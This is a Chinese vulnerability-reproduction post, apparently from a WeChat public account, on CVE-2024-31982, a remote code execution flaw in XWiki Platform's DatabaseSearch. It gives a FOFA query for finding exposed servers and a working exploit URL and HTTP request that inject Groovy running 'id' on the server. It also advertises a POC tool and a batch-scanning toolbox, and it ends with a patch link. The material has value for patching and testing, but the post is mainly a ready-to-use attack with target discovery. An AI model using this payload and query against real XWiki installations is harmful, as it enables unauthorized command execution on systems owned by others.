#  XWiki DatabaseSearch 存在远程命令执行漏洞CVE-2024-31982 附POC   
南风漏洞复现文库  南风漏洞复现文库   2024-06-24 22:59  
  
免责声明：请勿利用文章内的相关技术从事非法测试，由于传播、利用此文所提供的信息或者工具而造成的任何直接或者间接的后果及损失，均由使用者本人负责，所产生的一切不良后果与文章作者无关。该文章仅供学习用途使用。  
## 1. XWiki DatabaseSearch 简介  
  
微信公众号搜索：南风漏洞复现文库 该文章 南风漏洞复现文库 公众号首发  
  
XWiki Platform是XWiki基金会的一套用于创建Web协作应用程序的Wiki平台。  
## 2.漏洞描述  
  
XWiki Platform是XWiki基金会的一套用于创建Web协作应用程序的Wiki平台。XWiki Platform 存在安全漏洞，该漏洞源于 XWiki 的数据库搜索允许通过搜索文本远程执行代码。这允许公共 wiki 的任何访问者或封闭 wiki 的用户远程执行代码，因为默认情况下所有用户都可以访问数据库搜索。  
  
CVE编号:CVE-2024-31982  
  
CNNVD编号:CNNVD-202404-1609  
  
CNVD编号:  
## 3.影响版本  
  
XWiki Platform  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqYwKvELByZADzgT1UKqxA24BW49SibWcM9kzOe5eUbx1RhDCBqs1lbogQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
XWiki DatabaseSearch 存在远程命令执行漏洞  
## 4.fofa查询语句  
  
body="data-xwiki-reference"  
## 5.漏洞复现  
  
漏洞链接：https://xx.xx.xx.xx/bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20  
  
漏洞数据包：  
```
GET /bin/get/Main/DatabaseSearch?outputSyntax=plain&text=%7D%7D%7D%7B%7Basync%20async=false%7D%7D%7B%7Bgroovy%7D%7Dthrow%20new%20Exception%28%27id%27.execute%28%29.text%29%3B%7B%7B%2Fgroovy%7D%7D%7B%7B%2Fasync%7D%7D%20 HTTP/1.1
Host: xxx.xxx.xxx.xx
User-Agent: Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1)
Accept: */*
Connection: Keep-Alive
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqYINqXErux9P5mmiaMtDTuPkHsl0bcoyl9mGJnhZxtKhiaKw2VKycCXT3Q/640?wx_fmt=jpeg&from=appmsg "null")  
## 6.POC&EXP  
  
关注公众号 南风漏洞复现文库 并回复 漏洞复现10 即可获得该POC工具下载地址：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqY3BUlNPibe3qicCXic2exLCfmyBfkvcdnbQrxXRrrKKM8pSibIxlCgBdA3w/640?wx_fmt=jpeg&from=appmsg "null")  
  
本期漏洞及往期漏洞的批量扫描POC及POC工具箱已经上传知识星球：南风网络安全1: 更新poc批量扫描软件，承诺，一周更新8-14个插件吧，我会优先写使用量比较大程序漏洞。2: 免登录，免费fofa查询。3: 更新其他实用网络安全工具项目。4: 免费指纹识别，持续更新指纹库。  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqY5HUMBFoShzXBjziaI9y1O9fo0iawcRaicySib1DvIaiczibKdoD0C2LqPk0g/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqY6ziaibEj0PTD97ibQfiaWYWonntXQibmxXxlr8Bux9AicTPaL2znjZPkO2wQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqYIJ314BUUDbQ6iblCKSsF3xRicP8hyibH5ZhFShBMxGce6bIG7tbSo5LWQ/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqYGte71NW40u1QakeTT9SteXlYSkTJZUKk7QvTAMTjFFtlH0UdAEd2mg/640?wx_fmt=jpeg&from=appmsg "null")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_jpg/HsJDm7fvc3a1rkzfnBLcMhicnoLbxRKqYLf25iaAQEWuzUQ4PBkoAcM4EW9hTiakdMgicmUTRakBQyyjymEIr7V0AA/640?wx_fmt=jpeg&from=appmsg "null")  
## 7.整改意见  
  
打补丁 https://github.com/xwiki/xwiki-platform/security/advisories/GHSA-2858-8cfx-69m9  
## 8.往期回顾  
  
  
  
